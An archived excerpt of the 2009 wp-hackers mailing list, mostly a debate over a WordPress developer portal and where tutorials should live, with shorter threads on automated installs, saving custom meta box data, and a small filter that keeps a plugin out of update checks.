	<65b196650912120807l3458f765of3af33905e46920@mail.gmail.com> 
	<5dbff0c70912121005i85eac90qbab7df7463d03df6@mail.gmail.com> 
	<F343B5F9-1415-4491-8265-66F77996423F@xentek.net>
	<4B266EE8.1000800@bugssite.org>
Message-ID: <161617690912140911u679481a3jf4e795a83da70f15@mail.gmail.com>

On Mon, Dec 14, 2009 at 10:59 AM, Shane A. Froebel <shane at bugssite.org> wrote:
> What I don't like about that is that when you do a search in the codex,
> you can't really tell that it's a function.
>
> Just like Wikipedia -- *groans* --  get_posts (function) -- should be
> the title of the article or in a new namespace "Function:get_posts"
>
> Again I still think even the http://phpdoc.wordpress.org doesn't allow
> user examples. A mix of the Codex and PHPDoc would be something like the
> PHP.net function reference site.
>
> Tutorials could still be posted and then there could be user comments.
> Just another 2 cents.

I would have thought the "Function_Reference" bit gave it away.
There's also the Template Tags entry for get_posts, for example:

http://codex.wordpress.org/Template_Tags/get_posts

-Otto
Sent from Memphis, TN, United States

From shane at bugssite.org  Mon Dec 14 17:15:50 2009
From: shane at bugssite.org (Shane A. Froebel)
Date: Mon, 14 Dec 2009 12:15:50 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <161617690912140911u679481a3jf4e795a83da70f15@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>
	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com>
	<902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com>
	<db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com>
	<d863c64e0912120221h24ffa2ai80ebc62db1695f42@mail.gmail.com>
	<65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>
	<5dbff0c70912121005i85eac90qbab7df7463d03df6@mail.gmail.com>
	<F343B5F9-1415-4491-8265-66F77996423F@xentek.net>
	<4B266EE8.1000800@bugssite.org>
	<161617690912140911u679481a3jf4e795a83da70f15@mail.gmail.com>
Message-ID: <4B2672C6.8050207@bugssite.org>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

If you doing a search it gets quite confusing with everyone's else's
version of the same function.

Again, get_posts could be "get_posts (function)" and "get_posts
(template tags)"

Your Friend,
Shane
http://bugssite.org/

On 12/14/2009 12:11 PM, Otto wrote:
> On Mon, Dec 14, 2009 at 10:59 AM, Shane A. Froebel <shane at bugssite.org> wrote:
>> What I don't like about that is that when you do a search in the codex,
>> you can't really tell that it's a function.
>>
>> Just like Wikipedia -- *groans* --  get_posts (function) -- should be
>> the title of the article or in a new namespace "Function:get_posts"
>>
>> Again I still think even the http://phpdoc.wordpress.org doesn't allow
>> user examples. A mix of the Codex and PHPDoc would be something like the
>> PHP.net function reference site.
>>
>> Tutorials could still be posted and then there could be user comments.
>> Just another 2 cents.
> 
> I would have thought the "Function_Reference" bit gave it away.
> There's also the Template Tags entry for get_posts, for example:
> 
> http://codex.wordpress.org/Template_Tags/get_posts
> 
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (MingW32)

iQIcBAEBAgAGBQJLJnLFAAoJEC7/vS6gbNwFCFwP/RJsD0QcVzWc9BizIJL2ipyz
pFnUqjn6p2KiWtvnrlF24T1Xc7lOxGWGMMeHhmvHFEma1/9NfChqLw5Lzugx5cxl
XP8lnrAY5L+g6zqarZcNPxr7LpL2W/i4eJAfP7NqY50R388VyKEBwcsUGyjtfktm
77/NFhhp/drY8nmAneXq51eelJHBTYSQYxo24XzhFF45byevIRHQbqsfDxHpqqxn
HC0qJs23hwuMTvgbA693RNM/au4wrOMRFanh1+fspZc/uWHxpaaDNO/nmSPS9UPc
Frhv3Wy++y4I+klNnsqR/Wh6nr3EKp3alyJpkQC9epazjByszbdD3Vj3wV6id7yD
SuSrXmOtQfJQCPWQ0ENojI0PfG0/ZQOwt/TBKaUTEPtJbbDP99kdqxXEFRxbHfN/
9nXqjuiLQ//uYKPIE+nLZVmNgYxbAQae9vMXqZ8H7VZ4DOYJzo7K/qwCHujguJgb
zQWGa//BcqlMIYyfNsM9dZaOjReyPCwNZT3Jlaunavdykd7hITuXQfGTFP8qMYa0
OBdiKv5peqMBmfowZDVsQD0CR3SuE4TOHIBxFIsD8ahThhTaRrMka8ISgkyVseHX
WkKzK+I3egsxIy239oh3hV49STMWQ3XCiqQlJlkChFH0smuEt3GfQ7IpP8uXDkV3
7+rQH4xDvldaD66d2JoV
=WZDl
-----END PGP SIGNATURE-----

From otto at ottodestruct.com  Mon Dec 14 20:43:07 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 14 Dec 2009 14:43:07 -0600
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>

Tutorials. Nothing but tutorials on specific sections of WordPress and
the internal functionality.

If somebody searches for a function name, then they don?t need the
details about that function, or even minor little examples of using
it. What they need is an article that puts that function in context
with the rest of what they?re trying to do.

Give people that, encourage people to create those (and lets face it,
writing a tut is way simpler and more fun than writing documentation),
then you'll have something of value.

Also, lots of ppl already create these, they just put them on their
own blogs. Make a centralized site, let people contribute tuts to it
(even their pre-existing ones). People will do it. Mostly for the
fame, but that's as good a reason as any. :)

-Otto



On Fri, Dec 11, 2009 at 2:37 PM, Matt Mullenweg <m at mullenweg.com> wrote:
> If there were to be a developer portal for WordPress, someplace where if
> you're first getting started with hacking on WP, building plugins, creating
> themes, you could go and it'd have all the best resources in one place, what
> resources do you think would be important to have there?
>
> What do you wish you had when you first started developing for WordPress?
>
> (Bonus points if it's something that already exists, just scattered around.
> :))

From ncrice at gmail.com  Mon Dec 14 21:38:02 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Mon, 14 Dec 2009 16:38:02 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
Message-ID: <862d087f0912141338qcef84d7haecf0e272c68dfe0@mail.gmail.com>

On Mon, Dec 14, 2009 at 3:43 PM, Otto <otto at ottodestruct.com> wrote:

> Tutorials. Nothing but tutorials on specific sections of WordPress and
> the internal functionality.
>   ...


> Also, lots of ppl already create these, they just put them on their
> own blogs. Make a centralized site, let people contribute tuts to it
> (even their pre-existing ones). People will do it. Mostly for the
> fame, but that's as good a reason as any. :)
>
>
Instead of trying to encourage people to write tutorials on some corporate
looking documentation site, why not just have basic documentation on a
function, then have a list of blog posts from community members that explain
the function in greater context. Then, let the community vote on which
tutorial they think is best, and the tutorial that explains things best gets
to be at the top of the list.

This has two hidden benefits:

1. Sending traffic to the writers (a HUGE motivator)
2. True community. The decentralization of content makes WordPress a true,
thriving community. It'd be crazy to think that people would choose to write
at WP.org for free rather than their own blogs.

I think this approach meets the needs of the community by providing links to
quality, relevant tutorials, but also benefits the writers of those
tutorials and encourages them to write more of them.

Nathan

From ian at themeshaper.com  Mon Dec 14 21:43:01 2009
From: ian at themeshaper.com (Ian Stewart)
Date: Mon, 14 Dec 2009 15:43:01 -0600
Subject: [wp-hackers] Developer portal
In-Reply-To: <862d087f0912141338qcef84d7haecf0e272c68dfe0@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com> 
	<862d087f0912141338qcef84d7haecf0e272c68dfe0@mail.gmail.com>
Message-ID: <a8405fa30912141343v60155dedo205ef83158d084a2@mail.gmail.com>

+1 for not centralizing tutorials (I've said the same thing
elsewhere<http://www.wptavern.com/what-is-the-weakest-link-of-wordpress#comment-4989>and
I couldn't agree more) AND on introducing voting on links out to
tutorials.

-- 
Ian Stewart

http://ThemeShaper.com/
http://twitter.com/iandstewart/
http://ianstewart.stumbleupon.com/

From wordpress at dd32.id.au  Mon Dec 14 21:48:36 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Tue, 15 Dec 2009 08:48:36 +1100
Subject: [wp-hackers] Automate the installation of WordPress
In-Reply-To: <161617690912140646na98c5e4y9042f435b05fc5fb@mail.gmail.com>
References: <62961.193.75.63.21.1260736434.squirrel@webmail.mailadmin.no>
	<161617690912140646na98c5e4y9042f435b05fc5fb@mail.gmail.com>
Message-ID: <op.u4x6varuspxmuu@dd32>

I'll get some more time to clean it up after the release of 2.9... Life  
has been pretty hectic since..

On Tue, 15 Dec 2009 01:46:02 +1100, Otto <otto at ottodestruct.com> wrote:

> I've used this script to do quickie installs before:
>
> http://wpquickinstall.com/
>
> It has some bugs, but it mostly works.
>
> -Otto
> Sent from Memphis, TN, United States
>
>
> On Sun, Dec 13, 2009 at 2:33 PM, Andr? <andre at thehook.eu> wrote:
>> Hello,
>>
>> I want to make a script that install WordPress for my users without  
>> going
>> through the install.php?step=1 and ..?step=2.
>>
>> After what I have found there is a shell script made by Stephanie Booth
>> (http://climbtothestars.org/play/wordpress.sh.txt) but it is pretty old,
>> and is not working on the latest version of WP.
>>
>> The script above would be perfect for me after some stripping, but the
>> "wget $url/wp-admin/install.php?step=x" does not work, as it requires an
>> email address as input.
>>
>> I have been on the thought to just backup the whole database and change
>> the values I needed to, but then again all the times will be pretty old  
>> as
>> WP inserts comments and everything during installation that's dated on  
>> the
>> installation time.
>>
>> Is there anywhere I can find the SQL in a separate file?
>>
>>
>> Thanks,
>> Andr?
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From mikeschinkel at newclarity.net  Mon Dec 14 21:54:34 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 14 Dec 2009 16:54:34 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
Message-ID: <FA940C20-E440-431E-A421-AF7A59AF4657@newclarity.net>

On Dec 14, 2009, at 3:43 PM, Otto wrote:
> Tutorials. Nothing but tutorials on specific sections of WordPress and
> the internal functionality.
> 
> If somebody searches for a function name, then they don?t need the
> details about that function, or even minor little examples of using
> it. What they need is an article that puts that function in context
> with the rest of what they?re trying to do.
> 
> Give people that, encourage people to create those (and lets face it,
> writing a tut is way simpler and more fun than writing documentation),
> then you'll have something of value.

As a former (and future) developer trainer I'm 100% in agreement with Otto here. (Wow, can't believe I said that. :-)

-Mike


From mikeschinkel at newclarity.net  Mon Dec 14 21:55:42 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 14 Dec 2009 16:55:42 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <a8405fa30912141343v60155dedo205ef83158d084a2@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
	<862d087f0912141338qcef84d7haecf0e272c68dfe0@mail.gmail.com>
	<a8405fa30912141343v60155dedo205ef83158d084a2@mail.gmail.com>
Message-ID: <E1C118B4-5B51-4684-95B3-A1C465E113D2@newclarity.net>

On Dec 14, 2009, at 4:43 PM, Ian Stewart wrote:
> +1 for not centralizing tutorials (I've said the same thing
> elsewhere<http://www.wptavern.com/what-is-the-weakest-link-of-wordpress#comment-4989>and
> I couldn't agree more) AND on introducing voting on links out to
> tutorials.

Even better...

-Mike

From mpretty at voceconnect.com  Mon Dec 14 21:59:53 2009
From: mpretty at voceconnect.com (Michael Pretty)
Date: Mon, 14 Dec 2009 16:59:53 -0500
Subject: [wp-hackers]  Handling Custom Meta Boxes
In-Reply-To: <op.u4x6varuspxmuu@dd32>
References: <62961.193.75.63.21.1260736434.squirrel@webmail.mailadmin.no>	<161617690912140646na98c5e4y9042f435b05fc5fb@mail.gmail.com>
	<op.u4x6varuspxmuu@dd32>
Message-ID: <4B26B559.3030408@voceconnect.com>

I'm curious how most plugin developers handle saving settings from 
custom post meta_boxes.  I've always handled this by adding an action to 
save the result on 'save_post' and only updating if DOING_AUTOSAVE 
wasn't defined.  The problem with doing this, is that the save_post 
action is also called when a scheduled item is moved to published.  If 
this happens, the posted values from the meta_box isn't available and I 
can't alway use isset since that means I can never use checkboxes for input.

Suggestions?

Thank you.

-Michael (prettyboymp)

From scribu at gmail.com  Mon Dec 14 22:04:26 2009
From: scribu at gmail.com (scribu)
Date: Tue, 15 Dec 2009 00:04:26 +0200
Subject: [wp-hackers] Handling Custom Meta Boxes
In-Reply-To: <4B26B559.3030408@voceconnect.com>
References: <62961.193.75.63.21.1260736434.squirrel@webmail.mailadmin.no>
	<161617690912140646na98c5e4y9042f435b05fc5fb@mail.gmail.com>
	<op.u4x6varuspxmuu@dd32> <4B26B559.3030408@voceconnect.com>
Message-ID: <349fe48b0912141404r5bce99c9s4969bd191ce0e063@mail.gmail.com>

Besides DOING_AUTOSAVE, also check for DOING_AJAX and DOING_CRON.


On Mon, Dec 14, 2009 at 11:59 PM, Michael Pretty <mpretty at voceconnect.com>wrote:

> I'm curious how most plugin developers handle saving settings from custom
> post meta_boxes.  I've always handled this by adding an action to save the
> result on 'save_post' and only updating if DOING_AUTOSAVE wasn't defined.
>  The problem with doing this, is that the save_post action is also called
> when a scheduled item is moved to published.  If this happens, the posted
> values from the meta_box isn't available and I can't alway use isset since
> that means I can never use checkboxes for input.
>
> Suggestions?
>
> Thank you.
>
> -Michael (prettyboymp)
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From mikeschinkel at newclarity.net  Mon Dec 14 22:14:13 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 14 Dec 2009 17:14:13 -0500
Subject: [wp-hackers] Plugin Privacy Option (was Revisiting phone home
	and privacy)
In-Reply-To: <e1202cb10912140656w74b30d33ibca4c88aa0e4fd23@mail.gmail.com>
References: <4B1FC578.8010706@gaarai.com>
	<4BE2C583-2DC1-49CF-BD18-D4493E61B48B@striderweb.com>
	<e1202cb10912131553m1f8a4346q3689d2c9a20bcc38@mail.gmail.com>
	<71ddd7490912131603g71eb2e61nf1aa42de39cc6d00@mail.gmail.com>
	<31D97E2E-996B-48C9-B093-BFBE9AE6BBD9@striderweb.com>
	<e1202cb10912140656w74b30d33ibca4c88aa0e4fd23@mail.gmail.com>
Message-ID: <88F5B77F-9463-4201-B92C-639084879DBC@newclarity.net>

On Dec 14, 2009, at 9:56 AM, Jeremy Clarke wrote:
> On Sun, Dec 13, 2009 at 11:29 PM, Stephen Rider
> <wp-hackers at striderweb.com> wrote:
>> On Dec 13, 2009, at 6:03 PM, Doug Stewart wrote:
>> 
>>> What about this: what if you added a Plugin-Update-URI header field to
>>> plugins and themes? Themes or plugins without an explicitly-defined URI
>>> would default to checking api.wordpress.org while plugin/theme devs that
>>> don't (for whatever reasons) want to use the .org hosting environment can
>>> host their own updates. Then, we could supply the necessary info for 3rd
>>> parties to implement the expected return values from the update API and then
>>> they, too, could take advantage of the internal WordPress upgrade checking,
>>> further reducing ways that individual blogs can be compromised.
>> 
>> My plugin code notwithstanding, I like Doug's idea a lot.
> 
> It's a good idea too, though part of a bigger plan. The plugin code
> that achieves the same thing is much more likely to be a solution :)

I love the idea.  One thing that worries me is guarding against malicious intent. For example somebody puts up a bunch of plugs that do simple things each on their own website with cloaked owner info, and then get lots of users to a plugin? Next they add something evil and just wait for the users who are not paying attention to the state of WordPress to upgrade to the evil version. I know it sounds unlikely but it a potential.

That said, maybe a blacklist on WordPress.org that could be checked to block installation of malicious plugins? As soon as Dr. Evil version is released and someone notices, that plugin gets added to the blacklist with possibly even a link to find an alternate "clean" version so people are not left hanging if a new version of WordPress breaks their old plugin version.  (Somebody would have to clean it, of course.)

Just an idea. Thoughts?

-Mike Schinkel

From steph at sillybean.net  Mon Dec 14 22:26:20 2009
From: steph at sillybean.net (Stephanie Leary)
Date: Mon, 14 Dec 2009 22:26:20 +0000
Subject: [wp-hackers] Developer portal
In-Reply-To: <161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
Message-ID: <0b0031952830acaf6707e955a4aec383@laurel.joyent.us>


On Mon, 14 Dec 2009 14:43:07 -0600, Otto <otto at ottodestruct.com> wrote:
> Tutorials. Nothing but tutorials on specific sections of WordPress and
> the internal functionality.
> 
[... ]
> Also, lots of ppl already create these, they just put them on their
> own blogs. Make a centralized site, let people contribute tuts to it
> (even their pre-existing ones). People will do it. Mostly for the
> fame, but that's as good a reason as any. :)

I agree!

The problem with the alternative, linking from the Codex out to existing
tutorials, is that those tutorials wouldn't be part of the search index.

Stephanie Leary
sillybean.net

From ncrice at gmail.com  Mon Dec 14 22:48:44 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Mon, 14 Dec 2009 17:48:44 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
Message-ID: <862d087f0912141448y54cb959ap81e62e58af44cf06@mail.gmail.com>

On Mon, Dec 14, 2009 at 5:26 PM, Stephanie Leary <steph at sillybean.net>wrote:

>
> I agree!
>
> The problem with the alternative, linking from the Codex out to existing
> tutorials, is that those tutorials wouldn't be part of the search index.
>
>
Pulling everything into a central tutorial/documentation site (Codex) is:

1. It is anything but community.
Care to guess who wrote this Codex page?
http://codex.wordpress.org/wp_list_pages

Not that it would matter if there were attribution. If a person writes good
WordPress tutorials, but they do it all at WordPress.org, then what does it
benefit them to have a link back to their blog?

Community isn't everyone gathering in one room and living together ... it's
everyone living in their own place and cooperating to achieve similar goals.
Maybe one big site might seem like a good idea, but it will discourage
participation (see my next point).

2. The codex already exists and people choose to write tutorials on their
own blogs.

Let's face it, given the choice between contributing to Codex and writing a
tutorial on their own blogs, people choose to write the tutorials one their
own blogs where they feel they will get the most credit (or monetarily
benefit from traffic). Why not just sense where the winds are blowing and
raise the sails?

And before anyone actually does suggest it, please try to stay clear of any
suggestion to scrape content from blogs and post it on the Codex in any way,
shape, or form. That's just wrong.

Nathan

From dragonfly at dragonflyeye.net  Mon Dec 14 22:51:48 2009
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Mon, 14 Dec 2009 17:51:48 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
Message-ID: <77b239a00912141451x35ab5c0y7799347bd61689b9@mail.gmail.com>

... Well, there is Google....

The CakePHP site has the Bakery, which seems - to the extent that I've
visited it, which is perhaps not a lot - decently active. Its definitely the
place in the Cake world to do the same sort of things that Otto suggests for
WordPress. And it does work to an extent. The trouble is that when tutorials
become part of the central repository, there is an expectation set that they
will be complete in themselves, accurate and also complete in terms of
covering all subjects. In this way, the CakePHP Bakery fails miserably, as I
suspect a similar project for WP would fail.

Another problem is that, for complex subjects especially, each coder's own
style comes into play. External links allow people to describe a concept in
their own ways, leading to a more robust set of tutorials for a wider range
of learning styles. (wife's a teacher. I get this thinking from her....)

I do think the better option would be simple descriptions of each function
in WP that's usable in any way with a publicly-editable list of relevant
links.

On Mon, Dec 14, 2009 at 5:26 PM, Stephanie Leary <steph at sillybean.net>wrote:

>
> On Mon, 14 Dec 2009 14:43:07 -0600, Otto <otto at ottodestruct.com> wrote:
> > Tutorials. Nothing but tutorials on specific sections of WordPress and
> > the internal functionality.
> >
> [... ]
> > Also, lots of ppl already create these, they just put them on their
> > own blogs. Make a centralized site, let people contribute tuts to it
> > (even their pre-existing ones). People will do it. Mostly for the
> > fame, but that's as good a reason as any. :)
>
> I agree!
>
> The problem with the alternative, linking from the Codex out to existing
> tutorials, is that those tutorials wouldn't be part of the search index.
>
> Stephanie Leary
> sillybean.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp-hackers at striderweb.com  Mon Dec 14 22:59:48 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Mon, 14 Dec 2009 16:59:48 -0600 (CST)
Subject: [wp-hackers] Plugin Privacy Option (was Revisiting phone home
 and privacy)
In-Reply-To: <e1202cb10912140656w74b30d33ibca4c88aa0e4fd23@mail.gmail.com>
References: <4B1FC578.8010706@gaarai.com>
	<4BE2C583-2DC1-49CF-BD18-D4493E61B48B@striderweb.com>
	<e1202cb10912131553m1f8a4346q3689d2c9a20bcc38@mail.gmail.com>
	<71ddd7490912131603g71eb2e61nf1aa42de39cc6d00@mail.gmail.com>
	<31D97E2E-996B-48C9-B093-BFBE9AE6BBD9@striderweb.com>
	<e1202cb10912140656w74b30d33ibca4c88aa0e4fd23@mail.gmail.com>
Message-ID: <26735.207.135.184.38.1260831588.squirrel@striderweb.com>

Please note the code is untested -- I tossed that together based on an
existing plugin that does something different, but related.  So run the
thing before posting it as working.

And actually, now that I look at it, I think I'm doing it wrong there. 
Looks like it filters the data that's *returned* from the server, not the
data sent *to* the server.

Oops.

It's in the right direction, but needs a touch of work....

Stephen

On Mon, December 14, 2009 8:56 am, Jeremy Clarke wrote:
> On Sun, Dec 13, 2009 at 11:29 PM, Stephen Rider
> <wp-hackers at striderweb.com> wrote:
>> add_filter( 'option_update_plugins', 'filter_get_update_plugins' );
>> add_filter( 'transient_update_plugins', 'filter_get_update_plugins' );
>> // for cached data
>>
>> function filter_get_update_plugins( $data ) {
>> ? ? ? ?unset( $data->response['myplugin/myplugin.php'] );
>> ? ? ? ?return $data;
>> }
>
> Has anyone created a Codex page about this whole issue? It would be
> good to have this code there. Anyone with strong feelings about the
> issue want to put one together? It could have sections explaining each
> part of the update process and have ways of circumventing each:
> Sending url, sending server info, sending plugins list.



From mikeschinkel at newclarity.net  Mon Dec 14 23:14:25 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 14 Dec 2009 18:14:25 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <862d087f0912141448y54cb959ap81e62e58af44cf06@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
	<862d087f0912141448y54cb959ap81e62e58af44cf06@mail.gmail.com>
Message-ID: <D59C41A1-0D47-4900-82FB-D30AAB69CD95@newclarity.net>

On Dec 14, 2009, at 5:48 PM, Nathan Rice wrote:
> And before anyone actually does suggest it, please try to stay clear of any
> suggestion to scrape content from blogs and post it on the Codex in any way,
> shape, or form. That's just wrong.

Not if the scraping were used to fill the index but the links pointed to the offsite content, maybe?

-Mike

From mikeschinkel at newclarity.net  Mon Dec 14 23:15:53 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 14 Dec 2009 18:15:53 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <77b239a00912141451x35ab5c0y7799347bd61689b9@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
	<77b239a00912141451x35ab5c0y7799347bd61689b9@mail.gmail.com>
Message-ID: <B04AC0A5-102A-4F45-9699-16CE63EB0379@newclarity.net>

On Dec 14, 2009, at 5:51 PM, Thomas Belknap wrote:
> ... Well, there is Google....

But Google doesn't allow the community to tag an annotate articles, nor to associate similar ones and explicitly limit the index to include those that offer value vs. those that are merely fluff (or duplication.)

-Mike

From m at mullenweg.com  Mon Dec 14 23:21:55 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon, 14 Dec 2009 15:21:55 -0800
Subject: [wp-hackers] Developer portal
In-Reply-To: <862d087f0912141448y54cb959ap81e62e58af44cf06@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
	<862d087f0912141448y54cb959ap81e62e58af44cf06@mail.gmail.com>
Message-ID: <4B26C893.8090308@mullenweg.com>

On 2009-12-14 2:48 PM, Nathan Rice wrote:
> Not that it would matter if there were attribution. If a person writes good
> WordPress tutorials, but they do it all at WordPress.org, then what does it
> benefit them to have a link back to their blog?

It's true that when you contribute to WP it does require some 
sublimation of the ego. This is why you don't see developer names 
plastered all over the source code of core WP even when a class or 
function is largely the function of a single author. (In the beginning.)

The problem with offsite resources besides the sites change, shift, 
expire, redirect to porn, is that more fundamentally it's the product of 
a single person.

Much like canonical plugins, we want people to work together to create 
something better than they would be able to create on their own. (Just 
like WordPress works.) Our own Mark/Podz used to have fantastic 
tutorials on his site, but then he started to get overwhelmed with 
people contacting him for support because they were on his site, and 
then they got out of date and no one else updated them because they were 
"Mark's tutorials."

My favorite kind of attribution is collective, "we built this together." 
That's basically what we have on the wp.org about page now (though it's 
woefully incomplete), and what we've talked about for an easter egg 
credits page in WP core.

I fully expect there to be fantastic stuff posted on other sites just 
like there is today, just because we have some 
resources/tutorials/documentation on the official site doesn't mean the 
other stuff goes away.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From mikeschinkel at newclarity.net  Mon Dec 14 23:32:42 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 14 Dec 2009 18:32:42 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B26C893.8090308@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
	<862d087f0912141448y54cb959ap81e62e58af44cf06@mail.gmail.com>
	<4B26C893.8090308@mullenweg.com>
Message-ID: <71496CCC-EFB9-4D31-8E43-1838C2DBB78B@newclarity.net>

On Dec 14, 2009, at 6:21 PM, Matt Mullenweg wrote:
> On 2009-12-14 2:48 PM, Nathan Rice wrote:
>> Not that it would matter if there were attribution. If a person writes good
>> WordPress tutorials, but they do it all at WordPress.org, then what does it
>> benefit them to have a link back to their blog?
> 
> It's true that when you contribute to WP it does require some sublimation of the ego. This is why you don't see developer names plastered all over the source code of core WP even when a class or function is largely the function of a single author. (In the beginning.)
> 
> The problem with offsite resources besides the sites change, shift, expire, redirect to porn, is that more fundamentally it's the product of a single person.
> 
> Much like canonical plugins, we want people to work together to create something better than they would be able to create on their own. (Just like WordPress works.) Our own Mark/Podz used to have fantastic tutorials on his site, but then he started to get overwhelmed with people contacting him for support because they were on his site, and then they got out of date and no one else updated them because they were "Mark's tutorials."
> 
> My favorite kind of attribution is collective, "we built this together." That's basically what we have on the wp.org about page now (though it's woefully incomplete),

To Nathan's point, Nathan writes because it gets him exposure which ultimately helps him pay his bills.  For entrepreneurs (vs. employees of some organization) that exposure *allows* them to continue contributing to the WordPress community.  Automattic, OTOH, is making money from all this so they don't feel the pain.

I have zero qualms about Automattic making money, it should, I just want everyone to realize that free help to WordPress grows Automatic's revenue but does absolutely nothing for those individuals whose bills are paid by the ability to get paying work because of their *visible* contribution. Not acknowledging that and not considering how to make it easier for those people to get business who have contributed seems very disingenuous to me.  (FWIW, I'm not putting myself in the same category as Nathan, I'm an outside observer from that respect.)

>  and what we've talked about for an easter egg credits page in WP core.

That's only an ego booster but wouldn't really bring clients in the door. 

> I fully expect there to be fantastic stuff posted on other sites just like there is today, just because we have some resources/tutorials/documentation on the official site doesn't mean the other stuff goes away.

No, but it lowers the traffic they will receive from Google by probably an order of magnitude. It greatly reduces their motivation to publish information about WordPress on their blog.

Basically I'm saying I think there needs to be a strategy to create a central repository *and* to give those guys lots of traffic to their blogs.  FWIW.

-Mike

From ncrice at gmail.com  Mon Dec 14 23:41:41 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Mon, 14 Dec 2009 18:41:41 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B26C893.8090308@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
	<862d087f0912141448y54cb959ap81e62e58af44cf06@mail.gmail.com>
	<4B26C893.8090308@mullenweg.com>
Message-ID: <862d087f0912141541i4b484231jb1185cc499053e66@mail.gmail.com>

On Mon, Dec 14, 2009 at 6:21 PM, Matt Mullenweg <m at mullenweg.com> wrote:

>
> The problem with offsite resources besides the sites change, shift, expire,
> redirect to porn, is that more fundamentally it's the product of a single
> person.
>

Indeed. That's why I suggested a voting system where users could vote on
what tutorial best explained the function. Outdated tutorials could easily
be "voted off" in favor or new ones. If the tutorials are out of date, then
any blogger can fire up his editor and make a new one that IS up to date.

Much like canonical plugins, we want people to work together to create
> something better than they would be able to create on their own. (Just like
> WordPress works.)


